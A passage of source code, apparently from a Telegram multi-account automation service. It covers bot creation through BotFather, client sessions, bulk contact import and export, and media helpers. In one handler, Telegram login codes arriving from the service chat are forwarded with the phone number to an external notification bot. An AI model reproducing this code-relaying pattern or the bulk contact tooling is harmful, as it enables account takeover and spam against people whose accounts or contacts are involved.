(!tokenMatch) throw new Error('Could not extract bot token from BotFather response');\r\n        const botToken = tokenMatch[0];\r\n\r\n        if (options.description) {\r\n            await ctx.client.sendMessage(entity, { message: '/setdescription' });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n            await ctx.client.sendMessage(entity, { message: `@${options.username}` });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n            await ctx.client.sendMessage(entity, { message: options.description });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n\r\n        if (options.aboutText) {\r\n            await ctx.client.sendMessage(entity, { message: '/setabouttext' });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n            await ctx.client.sendMessage(entity, { message: `@${options.username}` });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n            await ctx.client.sendMessage(entity, { message: options.aboutText });\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n\r\n        if (options.profilePhotoUrl) {\r\n            try {\r\n                const photoBuffer = await downloadFileFromUrl(options.profilePhotoUrl);\r\n                await ctx.client.sendMessage(entity, { message: '/setuserpic' });\r\n                await new Promise(resolve => setTimeout(resolve, 1000));\r\n                await ctx.client.sendMessage(entity, { message: `@${options.username}` });\r\n                await new Promise(resolve => setTimeout(resolve, 1000));\r\n                await ctx.client.sendFile(entity, { file: Buffer.from(photoBuffer), caption: '', forceDocument: false });\r\n                await new Promise(resolve => setTimeout(resolve, 1000));\r\n            } catch (photoError) {\r\n                ctx.logger.error(ctx.phoneNumber, `[BOT CREATION] Failed to set profile photo: ${photoError.message}`, {});\r\n            }\r\n        }\r\n\r\n        ctx.logger.info(ctx.phoneNumber, `[BOT CREATION] Bot creation completed successfully: @${options.username}`);\r\n        return { botToken, username: botUsername };\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, `[BOT CREATION] Error: ${error.message}`, error);\r\n        throw new Error(`Failed to create bot: ${error.message}`);\r\n    }\r\n}\r\n","import { Api, TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\r\nimport { LogLevel } from 'telegram/extensions/Logger';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { TgContext } from './types';\r\nimport { getCredentialsForMobile } from '../../../utils';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { fetchWithTimeout } from '../../../utils/fetchWithTimeout';\r\nimport { notifbot } from '../../../utils/logbots';\r\nimport { generateTGConfig } from '../utils/generateTGConfig';\r\nimport { withTimeout } from '../../../utils/withTimeout';\r\nimport { unregisterClient } from '../utils/connection-manager';\r\n\r\nexport async function createClient(\r\n    ctx: TgContext,\r\n    session: StringSession,\r\n    handler: boolean = true,\r\n    handlerFn?: (event: NewMessageEvent) => Promise<void>\r\n): Promise<TelegramClient> {\r\n    const tgCreds = await getCredentialsForMobile(ctx.phoneNumber);\r\n    const apiHash = tgCreds.apiHash;\r\n    const apiId = tgCreds.apiId;\r\n    const tgConfiguration = await generateTGConfig(ctx.phoneNumber);\r\n\r\n    let client: TelegramClient | null = null;\r\n\r\n    try {\r\n        await withTimeout(async () => {\r\n            client = new TelegramClient(session, apiId, apiHash, tgConfiguration);\r\n            client.setLogLevel(LogLevel.ERROR);\r\n            (client as TelegramClient & { _errorHandler: (error: Error) => Promise<void> })._errorHandler = async (error: Error) => { handleClientError(ctx, error); };\r\n            await client.connect();\r\n            ctx.logger.info(ctx.phoneNumber, 'Connected Client Succesfully');\r\n        }, {\r\n            timeout: 180000,\r\n            errorMessage: `[Tg Manager]\\n${ctx.phoneNumber}: Client Creation TimeOut\\n`,\r\n        });\r\n\r\n        if (!client) {\r\n            throw new Error(`Client is null after connection attempt for ${ctx.phoneNumber}`);\r\n        }\r\n\r\n        if (handler && client) {\r\n            if (handlerFn) {\r\n                ctx.logger.info(ctx.phoneNumber, 'Adding Custom Event Handler');\r\n                client.addEventHandler(async (event: NewMessageEvent) => { await handlerFn(event); }, new NewMessage());\r\n            } else {\r\n                ctx.logger.info(ctx.phoneNumber, 'Adding Default Event Handler');\r\n                client.addEventHandler(async (event: NewMessageEvent) => { await handleIncomingEvent(ctx, event); }, new NewMessage());\r\n            }\r\n            if (!client.connected) {\r\n                throw new Error(`Client not connected after connection attempt for ${ctx.phoneNumber}`);\r\n            }\r\n        }\r\n\r\n        return client;\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Client creation failed', error);\r\n        if (client) {\r\n            try {\r\n                await client.destroy();\r\n            } catch (destroyError) {\r\n                ctx.logger.error(ctx.phoneNumber, 'Error destroying failed client', destroyError);\r\n            }\r\n        }\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function destroyClient(ctx: TgContext, session: StringSession): Promise<void> {\r\n    if (ctx.client) {\r\n        try {\r\n            ctx.client._errorHandler = null;\r\n            await ctx.client?.destroy();\r\n            ctx.client._eventBuilders = [];\r\n            session?.delete();\r\n            await sleep(2000);\r\n            ctx.logger.info(ctx.phoneNumber, 'Client Disconnected Sucessfully');\r\n        } catch (error) {\r\n            parseError(error, `${ctx.phoneNumber}: Error during client cleanup`);\r\n        } finally {\r\n            if (ctx.client) {\r\n                ctx.client._destroyed = true;\r\n                if (ctx.client._sender && typeof ctx.client._sender.disconnect === 'function') {\r\n                    await ctx.client._sender.disconnect();\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nexport function handleClientError(ctx: TgContext, error: Error): NodeJS.Timeout | null {\r\n    const { contains } = require('../../../utils');\r\n    const errorDetails = parseError(error, `${ctx.phoneNumber}: RPC Error`, false);\r\n    if ((error.message && error.message == 'TIMEOUT') || contains(errorDetails.message, ['ETIMEDOUT'])) {\r\n        ctx.logger.error(ctx.phoneNumber, `Timeout error occurred for ${ctx.phoneNumber}`, error);\r\n        return setTimeout(async () => {\r\n            if (ctx.client && !ctx.client.connected) {\r\n                ctx.logger.debug(ctx.phoneNumber, 'disconnecting client Connection Manually');\r\n                await unregisterClient(ctx.phoneNumber);\r\n            } else if (ctx.client) {\r\n                ctx.logger.debug(ctx.phoneNumber, 'Client Connected after Retry');\r\n            } else {\r\n                ctx.logger.debug(ctx.phoneNumber, 'Client does not exist');\r\n            }\r\n        }, 10000);\r\n    }\r\n    return null;\r\n}\r\n\r\nexport async function handleIncomingEvent(ctx: TgContext, event: NewMessageEvent): Promise<void> {\r\n    if (event.isPrivate) {\r\n        if (event.message.chatId.toString() == '777000') {\r\n            ctx.logger.info(ctx.phoneNumber, event.message.text.toLowerCase());\r\n            ctx.logger.info(ctx.phoneNumber, `Login Code received for - ${ctx.phoneNumber}\\nActiveClientSetup - TelegramManager.activeClientSetup`);\r\n            ctx.logger.info(ctx.phoneNumber, 'Date :', new Date(event.message.date * 1000));\r\n            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${ctx.phoneNumber}\\n${event.message.text}`)}`);\r\n        }\r\n    }\r\n}\r\n","import { Api } from 'telegram';\r\nimport * as fs from 'fs';\r\nimport bigInt from 'big-integer';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { TgContext, ContactStats, ImportContactResult, BlockListResult } from './types';\r\nimport { generateCSV, generateVCard, createVCardContent } from './helpers';\r\n\r\nexport async function addContact(ctx: TgContext, data: { mobile: string; tgId: string }[], namePrefix: string): Promise<void> {\r\n    try {\r\n        const results = await Promise.allSettled(\r\n            data.map(async (user, i) => {\r\n                const firstName = `${namePrefix}${i + 1}`;\r\n                await ctx.client.invoke(\r\n                    new Api.contacts.AddContact({\r\n                        firstName,\r\n                        lastName: '',\r\n                        phone: user.mobile,\r\n                        id: user.tgId,\r\n                    })\r\n                );\r\n            })\r\n        );\r\n        for (const result of results) {\r\n            if (result.status === 'rejected') {\r\n                ctx.logger.info(ctx.phoneNumber, result.reason);\r\n            }\r\n        }\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error adding contacts:', error);\r\n        const { parseError } = require('../../../utils/parseError');\r\n        parseError(error, `Failed to save contacts`);\r\n    }\r\n}\r\n\r\nexport async function addContacts(ctx: TgContext, mobiles: string[], namePrefix: string): Promise<void> {\r\n    try {\r\n        const inputContacts: Api.TypeInputContact[] = [];\r\n        for (let i = 0; i < mobiles.length; i++) {\r\n            const user = mobiles[i];\r\n            const firstName = `${namePrefix}${i + 1}`;\r\n            const clientId = bigInt((i << 16 | 0).toString(10));\r\n            inputContacts.push(new Api.InputPhoneContact({\r\n                clientId, phone: user, firstName, lastName: '',\r\n            }));\r\n        }\r\n\r\n        const result = await ctx.client.invoke(\r\n            new Api.contacts.ImportContacts({ contacts: inputContacts })\r\n        );\r\n        ctx.logger.info(ctx.phoneNumber, 'Imported Contacts Result:', result);\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error adding contacts:', error);\r\n        const { parseError } = require('../../../utils/parseError');\r\n        parseError(error, `Failed to save contacts`);\r\n    }\r\n}\r\n\r\nexport async function getContacts(ctx: TgContext): Promise<Api.contacts.TypeContacts> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    try {\r\n        return await ctx.client.invoke(new Api.contacts.GetContacts({ hash: bigInt(0) }));\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error getting contacts:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function blockUser(ctx: TgContext, chatId: string): Promise<void> {\r\n    try {\r\n        await ctx.client?.invoke(new Api.contacts.Block({ id: chatId }));\r\n        ctx.logger.info(ctx.phoneNumber, `User with ID ${chatId} has been blocked.`);\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Failed to block user:', error);\r\n    }\r\n}\r\n\r\nexport async function exportContacts(ctx: TgContext, format: 'vcard' | 'csv', includeBlocked: boolean = false): Promise<string> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const contactsResult = await ctx.client.invoke(new Api.contacts.GetContacts({}));\r\n    const contacts = ('users' in contactsResult ? contactsResult.users : []) as Api.User[];\r\n\r\n    let blockedContacts: Api.contacts.TypeBlocked | undefined;\r\n    if (includeBlocked) {\r\n        blockedContacts = await ctx.client.invoke(new Api.contacts.GetBlocked({ offset: 0, limit: 100 }));\r\n    }\r\n\r\n    if (format === 'csv') {\r\n        const csvData = contacts.map((contact: Api.User) => ({\r\n            firstName: contact.firstName || '',\r\n            lastName: contact.lastName || '',\r\n            phone: contact.phone || '',\r\n            blocked: blockedContacts && 'peerBlocked' in blockedContacts\r\n                ? ((blockedContacts as Api.contacts.Blocked).blocked || []).some((p: Api.PeerBlocked) =>\r\n                    (p.peerId instanceof Api.PeerUser) ? p.peerId.userId?.toString() === contact.id.toString() : false\r\n                )\r\n                : false,\r\n        }));\r\n        return generateCSV(csvData);\r\n    } else {\r\n        return generateVCard(contacts);\r\n    }\r\n}\r\n\r\nexport async function importContacts(ctx: TgContext, data: { firstName: string; lastName?: string; phone: string }[]): Promise<ImportContactResult[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const results = await Promise.all(data.map(async contact => {\r\n        try {\r\n            await ctx.client.invoke(new Api.contacts.ImportContacts({\r\n                contacts: [new Api.InputPhoneContact({\r\n                    clientId: bigInt(Math.floor(Math.random() * 1000000)),\r\n                    phone: contact.phone,\r\n                    firstName: contact.firstName,\r\n                    lastName: contact.lastName || '',\r\n                })],\r\n            }));\r\n            return { success: true, phone: contact.phone };\r\n        } catch (error) {\r\n            return { success: false, phone: contact.phone, error: error.message };\r\n        }\r\n    }));\r\n\r\n    return results;\r\n}\r\n\r\nexport async function manageBlockList(ctx: TgContext, userIds: string[], block: boolean): Promise<BlockListResult[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const results = await Promise.all(userIds.map(async userId => {\r\n        try {\r\n            if (block) {\r\n                await ctx.client.invoke(new Api.contacts.Block({ id: await ctx.client.getInputEntity(userId) }));\r\n            } else {\r\n                await ctx.client.invoke(new Api.contacts.Unblock({ id: await ctx.client.getInputEntity(userId) }));\r\n            }\r\n            return { success: true, userId };\r\n        } catch (error) {\r\n            return { success: false, userId, error: error.message };\r\n        }\r\n    }));\r\n\r\n    return results;\r\n}\r\n\r\nexport async function getContactStatistics(ctx: TgContext): Promise<ContactStats> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const contactsResult = await ctx.client.invoke(new Api.contacts.GetContacts({}));\r\n    const contacts = ('users' in contactsResult ? contactsResult.users : []) as Api.User[];\r\n\r\n    const onlineContacts = contacts.filter((c: Api.User) => c.status && 'wasOnline' in c.status);\r\n\r\n    return {\r\n        total: contacts.length,\r\n        online: onlineContacts.length,\r\n        withPhone: contacts.filter((c: Api.User) => c.phone).length,\r\n        mutual: contacts.filter((c: Api.User) => c.mutualContact).length,\r\n        lastWeekActive: onlineContacts.filter((c: Api.User) => {\r\n            const status = c.status as Api.UserStatusOffline;\r\n            const lastSeen = new Date(status.wasOnline * 1000);\r\n            const weekAgo = new Date();\r\n            weekAgo.setDate(weekAgo.getDate() - 7);\r\n            return lastSeen > weekAgo;\r\n        }).length,\r\n    };\r\n}\r\n\r\nexport async function sendContactsFile(ctx: TgContext, chatId: string, contacts: Api.contacts.Contacts, filename: string = 'contacts.vcf'): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const vCardContent = createVCardContent(contacts);\r\n        const tempPath = `./contacts/${chatId}-${filename}`;\r\n\r\n        if (!fs.existsSync('./contacts')) {\r\n            fs.mkdirSync('./contacts', { recursive: true });\r\n        }\r\n\r\n        fs.writeFileSync(tempPath, vCardContent, 'utf8');\r\n\r\n        try {\r\n            const fileContent = fs.readFileSync(tempPath);\r\n            const file = new CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);\r\n            await ctx.client.sendFile(chatId, {\r\n                file,\r\n                caption: `Contacts file with ${contacts.users.length} contacts`,\r\n                forceDocument: true,\r\n            });\r\n            ctx.logger.info(ctx.phoneNumber, `Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);\r\n        } finally {\r\n            if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);\r\n        }\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error sending contacts file:', error);\r\n        throw error;\r\n    }\r\n}\r\n","import { Api } from 'telegram';\r\nimport axios from 'axios';\r\nimport { MediaMetadataItem, DocumentMediaDetails, SenderInfo, MediaInfo } from './types';\r\n\r\n// ---- Constants ----\r\nexport const MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB\r\nexport const FILE_DOWNLOAD_TIMEOUT = 60000; // 60 seconds\r\nexport const TEMP_FILE_CLEANUP_DELAY = 3600000; // 1 hour\r\nexport const THUMBNAIL_CONCURRENCY_LIMIT = 3;\r\nexport const THUMBNAIL_BATCH_DELAY_MS = 100;\r\n\r\n// ---- Search filter mapping ----\r\n\r\nexport function getSearchFilter(filter: string): Api.TypeMessagesFilter {\r\n    switch (filter) {\r\n        case 'photo': return new Api.InputMessagesFilterPhotos();\r\n        case 'video': return new Api.InputMessagesFilterVideo();\r\n        case 'document': return new Api.InputMessagesFilterDocument();\r\n        case 'url': return new Api.InputMessagesFilterUrl();\r\n        case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();\r\n        case 'photoVideo': return new Api.InputMessagesFilterPhotoVideo();\r\n        case 'voice': return new Api.InputMessagesFilterVoice();\r\n        case 'roundVoice': return new Api.InputMessagesFilterRoundVoice();\r\n        case 'gif': return new Api.InputMessagesFilterGif();\r\n        case 'sticker': return new Api.InputMessagesFilterDocument();\r\n        case 'animation': return new Api.InputMessagesFilterDocument();\r\n        case 'music': return new Api.InputMessagesFilterMusic();\r\n        case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\r\n        case 'location': return new Api.InputMessagesFilterGeo();\r\n        case 'contact': return new Api.InputMessagesFilterContacts();\r\n        case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({});\r\n        default: return new Api.InputMessagesFilterEmpty();\r\n    }\r\n}\r\n\r\n// ---- Media type detection ----\r\n\r\nexport function getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\r\n    if (media instanceof Api.MessageMediaPhoto) {\r\n        return 'photo';\r\n    } else if (media instanceof Api.MessageMediaDocument) {\r\n        const document = media.document as Api.Document;\r\n        if (document?.attributes?.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\r\n            return 'video';\r\n        }\r\n        return 'document';\r\n    }\r\n    return 'document';\r\n}\r\n\r\n// ---- Date extraction ----\r\n\r\nexport function getMessageDate(message: Api.Message): number {\r\n    const msgDate = message.date;\r\n    if (msgDate) {\r\n        if (typeof msgDate === 'number') {\r\n            return msgDate;\r\n        } else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {\r\n            return Math.floor((msgDate as { getTime: () => number }).getTime() / 1000);\r\n        }\r\n    }\r\n    return Math.floor(Date.now() / 1000);\r\n}\r\n\r\n// ---- Shared media metadata extraction ----\r\n\r\nexport function extractMediaMetaFromMessage(\r\n    message: Api.Message,\r\n    chatId: string,\r\n    mediaType: string\r\n): MediaMetadataItem {\r\n    let fileSize: number | undefined;\r\n    let mimeType: string | undefined;\r\n    let filename: string | undefined;\r\n    let width: number | undefined;\r\n    let height: number | undefined;\r\n    let duration: number | undefined;\r\n\r\n    if (message.media instanceof Api.MessageMediaPhoto) {\r\n        const photo = message.photo as Api.Photo;\r\n        mimeType = 'image/jpeg';\r\n        filename = 'photo.jpg';\r\n        if (photo?.sizes && photo.sizes.length > 0) {\r\n            const largestSize = photo.sizes[photo.sizes.length - 1];\r\n            if (largestSize && 'size' in largestSize) fileSize = (largestSize as Api.PhotoSize).size;\r\n            if (largestSize && 'w' in largestSize) width = (largestSize as Api.PhotoSize).w;\r\n            if (largestSize && 'h' in largestSize) height = (largestSize as Api.PhotoSize).h;\r\n        }\r\n    } else if (message.media instanceof Api.MessageMediaDocument) {\r\n        const doc = message.media.document;\r\n        if (doc instanceof Api.Document) {\r\n            fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);\r\n            mimeType = doc.mimeType;\r\n            const fileNameAttr = doc.attributes?.find(attr => attr instanceof Api.DocumentAttributeFilename) as Api.DocumentAttributeFilename;\r\n            filename = fileNameAttr?.fileName;\r\n            const videoAttr = doc.attributes?.find(attr => attr instanceof Api.DocumentAttributeVideo) as Api.DocumentAttributeVideo;\r\n            if (videoAttr) {\r\n                width = videoAttr.w;\r\n                height = videoAttr.h;\r\n                duration = videoAttr.duration;\r\n            }\r\n            const audioAttr = doc.attributes?.find(attr => attr instanceof Api.DocumentAttributeAudio) as Api.DocumentAttributeAudio;\r\n            if (audioAttr && !duration) duration = audioAttr.duration;\r\n        }\r\n    }\r\n\r\n    return {\r\n        messageId: message.id,\r\n        chatId,\r\n        type: mediaType,\r\n        date: getMessageDate(message),\r\n        caption: message.message || '',\r\n        fileSize,\r\n        mimeType,\r\n        filename,\r\n        width,\r\n        height,\r\n        duration,\r\n    };\r\n}\r\n\r\n// ---- Document media details ----\r\n\r\nexport function getMediaDetails(media: Api.MessageMediaDocument): DocumentMediaDetails | null {\r\n    if (!media?.document) return null;\r\n    const doc = media.document;\r\n    if (doc instanceof Api.DocumentEmpty) return null;\r\n\r\n    const videoAttr = doc.attributes.find(attr =>\r\n        attr instanceof Api.DocumentAttributeVideo\r\n    ) as Api.DocumentAttributeVideo;\r\n\r\n    const fileNameAttr = doc.attributes.find(attr =>\r\n        attr instanceof Api.DocumentAttributeFilename\r\n    ) as Api.DocumentAttributeFilename;\r\n\r\n    return {\r\n        size: doc.size,\r\n        mimeType: doc.mimeType,\r\n        fileName: fileNameAttr?.fileName || null,\r\n        duration: videoAttr?.duration || null,\r\n        width: videoAttr?.w || null,\r\n        height: videoAttr?.h || null,\r\n    };\r\n}\r\n\r\n// ---- Content type detection ----\r\n\r\nexport function detectContentType(filename: string, mimeType?: string): string {\r\n    if (mimeType) return mimeType;\r\n\r\n    const ext = filename.split('.').pop()?.toLowerCase() || '';\r\n    const mimeMap: Record<string, string> = {\r\n        'jpg': 'image/jpeg',\r\n        'jpeg': 'image/jpeg',\r\n        'png': 'image/png',\r\n        'gif': 'image/gif',\r\n        'webp': 'image/webp',\r\n        'mp4': 'video/mp4',\r\n        'webm': 'video/webm',\r\n        'mov': 'video/quicktime',\r\n        'avi': 'video/x-msvideo',\r\n        'ogg': 'audio/ogg',\r\n        'mp3': 'audio/mpeg',\r\n        'wav': 'audio/wav',\r\n        'pdf': 'application/pdf',\r\n        'zip': 'application/zip',\r\n        'doc': 'application/msword',\r\n        'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',\r\n    };\r\n\r\n    return mimeMap[ext] || 'application/octet-stream';\r\n}\r\n\r\n// ---- ETag generation ----\r\n\r\nimport bigInt from 'big-integer';\r\n\r\nexport function generateETag(messageId: number, chatId: string, fileId: bigInt.BigInteger | string | number): string {\r\n    const fileIdStr = typeof fileId === 'object' ? fileId.toString() : String(fileId);\r\n    return `\"${messageId}-${chatId}-${fileIdStr}\"`;\r\n}\r\n\r\n// ---- File download ----\r\n\r\nexport async function downloadFileFromUrl(url: string, maxSize: number = MAX_FILE_SIZE): Promise<Buffer> {\r\n    try {\r\n        const headResponse = await axios.head(url, {\r\n            timeout: FILE_DOWNLOAD_TIMEOUT,\r\n            validateStatus: (status) => status >= 200 && status < 400,\r\n        });\r\n\r\n        const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);\r\n        if (contentLength > maxSize) {\r\n            throw new Error(`File size ${contentLength} exceeds maximum ${maxSize} bytes`);\r\n        }\r\n\r\n        const response = await axios.get(url, {\r\n            responseType: 'arraybuffer',\r\n            timeout: FILE_DOWNLOAD_TIMEOUT,\r\n            maxContentLength: maxSize,\r\n            validateStatus: (status) => status >= 200 && status < 300,\r\n        });\r\n\r\n        const buffer = Buffer.from(response.data);\r\n        if (buffer.length > maxSize) {\r\n            throw new Error(`Downloaded file size ${buffer.length} exceeds maximum ${maxSize} bytes`);\r\n        }\r\n\r\n        return buffer;\r\n    } catch (error) {\r\n        if (error.response) {\r\n            throw new Error(`Failed to download file: HTTP ${error.response.status} - ${error.response.statusText}`);\r\n        } else if (error.code === 'ECONNABORTED') {\r\n            throw new Error(`Failed to download file: Request timeout after ${FILE_DOWNLOAD_TIMEOUT}ms`);\r\n        } else {\r\n            throw new Error(`Failed to download file: ${error.message}`);\r\n        }\r\n    }\r\n}\r\n\r\n// ---- Timeout wrapper ----\r\n\r\nexport async function downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\r\n    return Promise.race([\r\n        promise,\r\n        new Promise<T>((_, reject) =>\r\n            setTimeout(() => reject(new Error('Download timeout')), timeout)\r\n        ),\r\n    ]);\r\n}\r\n\r\n// ---- Concurrency limiter ----\r\n\r\nexport async function processWithConcurrencyLimit<T, R>(\r\n    items: T[],\r\n    processor: (item: T) => Promise<R>,\r\n    concurrencyLimit: number = THUMBNAIL_CONCURRENCY_LIMIT,\r\n    batchDelay: number = THUMBNAIL_BATCH_DELAY_MS\r\n): Promise<R[]> {\r\n    const results: R[] = [];\r\n    const errors: Error[] = [];\r\n\r\n    for (let i = 0; i < items.length; i += concurrencyLimit) {\r\n        const batch = items.slice(i, i + concurrencyLimit);\r\n        const batchResults = await Promise.allSettled(\r\n            batch.map(item => processor(item))\r\n        );\r\n\r\n        for (const result of batchResults) {\r\n            if (result.status === 'fulfilled') {\r\n                results.push(result.value);\r\n            } else {\r\n                errors.push(result.reason);\r\n            }\r\n        }\r\n\r\n        if (i + concurrencyLimit < items.length && batchDelay > 0) {\r\n            await new Promise(resolve => setTimeout(resolve, batchDelay));\r\n        }\r\n    }\r\n\r\n    return results;\r\n}\r\n\r\n// ---- MIME type helpers ----\r\n\r\nexport function getMimeType(type: string): string {\r\n    switch (type) {\r\n        case 'photo': return 'image/jpeg';\r\n        case 'video': return 'video/mp4';\r\n        case 'document': return 'application/octet-stream';\r\n        default: return 'application/octet-stream';\r\n    }\r\n}\r\n\r\nexport function getMediaExtension(mediaOrType: string | Api.TypeMessageMedia): string {\r\n    if (typeof mediaOrType === 'string') {\r\n        switch (mediaOrType) {\r\n            case 'photo': return 'jpg';\r\n            case 'video': return 'mp4';\r\n            default: return 'bin';\r\n        }\r\n    }\r\n\r\n    const media = mediaOrType;\r\n    if (!media) return 'bin';\r\n\r\n    if (media instanceof Api.MessageMediaPhoto) return 'jpg';\r\n    if (media instanceof Api.MessageMediaDocument) {\r\n        const doc = (media as Api.MessageMediaDocument).document;\r\n        if (!doc || !('mimeType' in doc)) return 'bin';\r\n        const mime = (doc as Api.Document).mimeType;\r\n        if (mime?.startsWith('video/')) return 'mp4';\r\n        if (mime?.startsWith('image/')) return mime.split('/')[1];\r\n        if (mime?.startsWith('audio/')) return 'ogg';\r\n        return 'bin';\r\n    }\r\n    return 'bin';\r\n}\r\n\r\nexport function getMediaAttributes(item: { type: string; fileName?: string }): Api.TypeDocumentAttribute[] {\r\n    const attributes: Api.TypeDocumentAttribute[] = [];\r\n\r\n    if (item.fileName) {\r\n        attributes.push(new Api.DocumentAttributeFilename({ fileName: item.fileName }));\r\n    }\r\n\r\n    if (item.type === 'video') {\r\n        attributes.push(new Api.DocumentAttributeVideo({\r\n            duration: 0,\r\n            w: 1280,\r\n            h: 720,\r\n            supportsStreaming: true,\r\n        }));\r\n    }\r\n\r\n    return attributes;\r\n}\r\n\r\n// ---- Entity ID extraction ----\r\n\r\nexport function getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\r\n    if (entity instanceof Api.User) return entity.id.toString();\r\n    if (entity instanceof Api.Channel) return entity.id.toString();\r\n    if (entity instanceof Api.Chat) return entity.id.toString();\r\n    return '';\r\n}\r\n\r\n// ---- CSV / vCard generation ----\r\n\r\nexport function generateCSV(contacts: Array<{ firstName: string; lastName: string; phone: string; blocked: boolean }>): string {\r\n    const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\r\n    const rows = contacts.map(contact => [\r\n        contact.firstName,\r\n        contact.lastName,\r\n        contact.phone,\r\n        contact.blocked,\r\n    ].join(','));\r\n    return [header, ...rows].join('\\n');\r\n}\r\n\r\nexport function generateVCard(contacts: Array<{ firstName?: string; lastName?: string; phone?: string }>): string {\r\n    return contacts.map(contact => {\r\n        const vcard = [\r\n            'BEGIN:VCARD',\r\n            'VERSION:3.0',\r\n            `FN:${contact.firstName || ''} ${contact.lastName || ''}`.trim(),\r\n            `TEL;TYPE=CELL:${contact.phone || ''}`,\r\n            'END:VCARD',\r\n        ];\r\n        return vcard.join('\\n');\r\n    }).join('\\n\\n');\r\n}\r\n\r\nexport function createVCardContent(contacts: Api.contacts.Contacts): string {\r\n    let vCardContent = '';\r\n    contacts.users.map((rawUser: Api.TypeUser) => {\r\n        const user = rawUser as Api.User;\r\n        vCardContent += 'BEGIN:VCARD\\n';\r\n        vCardContent += 'VERSION:3.0\\n';\r\n        vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\\n`;\r\n        vCardContent += `TEL;TYPE=CELL:${user.phone}\\n`;\r\n        vCardContent += 'END:VCARD\\n';\r\n    });\r\n    return vCardContent;\r\n}\r\n\r\n// ---- Standardized date/media/sender helpers ----\r\n\r\nexport function toISODate(timestamp: number): string {\r\n    return new Date(timestamp * 1000).toISOString();\r\n}\r\n\r\n/** Time-only string for UI (e.g. \"21:50\") from Unix seconds */\r\nexport function toTimeString(timestamp: number): string {\r\n    const d = new Date(timestamp * 1000);\r\n    const h = d.getHours();\r\n    const m = d.getMinutes();\r\n    return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}`;\r\n}\r\n\r\nexport function bufferToBase64DataUrl(buffer: Buffer, mimeType: string = 'image/jpeg'): string {\r\n    return `data:${mimeType};base64,${buffer.toString('base64')}`;\r\n}\r\n\r\nexport function resolveEntityToSenderInfo(\r\n    entity: Api.User | Api.Chat | Api.Channel | null,\r\n    senderId: string,\r\n    isSelf: boolean,\r\n): SenderInfo {\r\n    if (entity instanceof Api.User) {\r\n        return {\r\n            id: senderId,\r\n            firstName: entity.firstName || null,\r\n            lastName: entity.lastName || null,\r\n            username: entity.username || null,\r\n            phone: entity.phone || null,\r\n            isSelf,\r\n            peerType: 'user',\r\n        };\r\n    }\r\n    if (entity instanceof Api.Chat) {\r\n        return {\r\n            id: senderId,\r\n            firstName: entity.title || null,\r\n            lastName: null,\r\n            username: null,\r\n            phone: null,\r\n            isSelf: false,\r\n            peerType: 'group',\r\n        };\r\n    }\r\n    if (entity instanceof Api.Channel) {\r\n        return {\r\n            id: senderId,\r\n            firstName: entity.title || null,\r\n            lastName: null,\r\n            username: entity.username || null,\r\n            phone: null,\r\n            isSelf: false,\r\n            peerType: 'channel',\r\n        };\r\n    }\r\n    return {\r\n        id: senderId,\r\n        firstName: null,\r\n        lastName: null,\r\n        username: null,\r\n        phone: null,\r\n        isSelf,\r\n        peerType: 'unknown',\r\n    };\r\n}\r\n\r\nexport function extractMediaInfo(\r\n    message: Api.Message,\r\n    thumbnailBuffer: Buffer | null,\r\n): MediaInfo | null {\r\n    if (!message.media || message.media instanceof Api.MessageMediaEmpty) {\r\n        return null;\r\n    }\r\n\r\n    const mediaType = getMediaType(message.media);\r\n    const meta = extractMediaMetaFromMessage(message, '', mediaType);\r\n\r\n    return {\r\n        type: mediaType,\r\n        thumbnail: thumbnailBuffer ? bufferToBase64DataUrl(thumbnailBuffer) : null,\r\n        mimeType: meta.mimeType || null,\r\n        fileName: meta.filename || null,\r\n        fileSize: meta.fileSize || null,\r\n        width: 